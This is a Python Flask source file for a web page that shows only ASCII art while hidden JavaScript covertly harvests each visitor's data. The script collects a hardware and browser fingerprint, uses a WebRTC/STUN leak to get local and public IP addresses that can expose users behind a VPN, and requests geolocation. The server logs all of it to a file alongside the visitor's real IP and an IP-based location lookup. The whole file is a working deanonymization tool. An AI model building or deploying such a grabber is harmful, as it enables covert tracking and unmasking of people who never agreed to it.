from flask import Flask, request, Response
from datetime import datetime
import requests
import os

LOG_FILE = "ip.log"
app = Flask(__name__)

def get_real_ip():
    """Получаем реальный IP пользователя с учётом Cloudflare и прокси"""
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip:
        return cf_ip

    xff = request.headers.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()

    return request.remote_addr

def get_geo(ip):
    """Фоллбек по IP через ipinfo.io"""
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        data = r.json()
        loc = data.get("loc")
        if loc:
            return loc  # "lat,lon"
    except:
        pass
    return "0,0"

@app.route("/")
def index():
    """Отдаём страницу с ASCII и JS для геолокации с fallback на IP"""
    html = """
<pre>
                   ,.
                 ,'  `.
               ,' _<>_ `.
             ,'.-'____`-.`.
           ,'_.-''    ``-._`.
         ,','      /\\      `.`.
       ,' /.._  O /  \\ O  _.,\\ `.
     ,'/ /  \\ ``-;.--.:-'' /  \\ \\`.
   ,' : :    \\  /\\`.,'/\\  /    : : `.
  < <>| |   O >(< (  ) >)< O   | |<> >
   `. : :    /  \\/,'`.\\/  \\    ; ; ,'
     `.\\ \\  /_..-:`--';-.._\\  / /,'
       `. \\`'   O \\  / O   `'/ ,'
         `.`._     \\/     _,','
           `..``-.____.-'',,'
             `.`-.____.-','
               `.  <>  ,'
                 `.  ,' 
                   `'
</pre>
<script>
(async () => {

  function getNetworkInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return null;
    return {
      effectiveType: c.effectiveType || null,
      rtt: c.rtt || null,
      downlink: c.downlink || null,
      saveData: c.saveData || false
    };
  }

  function getGPU() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return null;
      const debug = gl.getExtension("WEBGL_debug_renderer_info");
      if (!debug) return "hidden";
      return {
        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
      };
    } catch {
      return null;
    }
  }

  const payload = {
    hw: {
      platform: navigator.platform || null,
      ua: navigator.userAgent || null,
      cores: navigator.hardwareConcurrency || null,
      memory: navigator.deviceMemory || null,
      screen: {
        w: screen.width,
        h: screen.height,
        dpr: window.devicePixelRatio
      },
      touch: navigator.maxTouchPoints || 0,
      gpu: getGPU(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
      language: navigator.language || null
    },
    net: getNetworkInfo(),
    webrtc: {
      ips: [],
      localIPs: [],
      publicIPs: [],
      candidates: [],
      codecs: [],
      stats: {}
    }
  };

  /* ==== WebRTC ==== */
  try {
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" }
      ]
    });

    pc.createDataChannel("x");

    pc.onicecandidate = e => {
      if (!e.candidate) return;
      const c = e.candidate.candidate;
      payload.webrtc.candidates.push(c);

      const m = c.match(/candidate:\\d+ \\d+ (udp|tcp) \\d+ ([\\w:.]+)/);
      if (!m) return;

      const ip = m[2];
      if (!payload.webrtc.ips.includes(ip)) {
        payload.webrtc.ips.push(ip);
        if (
          ip.startsWith("10.") ||
          ip.startsWith("192.") ||
          ip.startsWith("172.")
        ) {
          payload.webrtc.localIPs.push(ip);
        } else {
          payload.webrtc.publicIPs.push(ip);
        }
      }
    };

    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);

    if (RTCRtpSender.getCapabilities) {
      const caps = RTCRtpSender.getCapabilities("video");
      if (caps && caps.codecs) {
        payload.webrtc.codecs = caps.codecs.map(c => ({
          mime: c.mimeType,
          clock: c.clockRate,
          fmtp: c.sdpFmtpLine
        }));
      }
    }

    setTimeout(async () => {
      const stats = await pc.getStats();
      stats.forEach(r => {
        if (r.type === "candidate-pair" && r.state === "succeeded") {
          payload.webrtc.stats = {
            rtt: r.currentRoundTripTime,
            bitrate: r.availableOutgoingBitrate
          };
        }
      });
      pc.close();
      sendPayload();
    }, 2000);

  } catch (e) {
    sendPayload();
  }

  function sendPayload() {
    fetch("/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      p => {
        payload.geo = { lat: p.coords.latitude, lon: p.coords.longitude };
        payload.source = "geo";
      },
      _ => payload.source = "ip",
      { timeout: 30000 }
    );
  } else {
    payload.source = "ip";
  }

})();
</script>
"""
    return Response(html, mimetype="text/html")

@app.route("/log", methods=["POST"])
def log():
    ip = get_real_ip()
    ua = request.headers.get("User-Agent", "unknown")
    country = request.headers.get("CF-IPCountry", "unknown")
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    data = request.json or {}

    # GEO
    if data.get("source") == "geo" and data.get("geo"):
        loc = f"{data['geo'].get('lat')},{data['geo'].get('lon')}"
        src = "GEO"
    else:
        loc = get_geo(ip)
        src = "IP"

    # HARDWARE
    net = data.get("net", {})
    webrtc = data.get("webrtc", {})
    hw = data.get("hw", {})
    gpu = hw.get("gpu")



    webrtc_line = (
      f"WebRTC_IPs:{webrtc.get('ips')} | "
      f"Local:{webrtc.get('localIPs')} | "
      f"Public:{webrtc.get('publicIPs')} | "
      f"RTT:{webrtc.get('stats', {}).get('rtt')} | "
      f"Bitrate:{webrtc.get('stats', {}).get('bitrate')}"
    )
    hw_line = (
        f"Platform:{hw.get('platform')} | "
        f"Cores:{hw.get('cores')} | "
        f"RAM:{hw.get('memory')}GB | "
        f"Screen:{hw.get('screen')} | "
        f"Touch:{hw.get('touch')} | "
        f"TZ:{hw.get('timezone')} | "
        f"Lang:{hw.get('language')} | "
        f"GPU:{gpu}"
    )
    net_line = (
      f"NetType:{net.get('effectiveType')} | "
      f"RTT:{net.get('rtt')}ms | "
      f"Down:{net.get('downlink')}Mb | "
      f"SaveData:{net.get('saveData')}"
    )
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(
           f"{time} | IP:{ip} | Country:{country} | "
           f"Loc:{loc} | SRC:{src} | "
           f"{hw_line} | {net_line} | "
           f"{webrtc_line} | UA:{ua}\n"
        )

    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3333)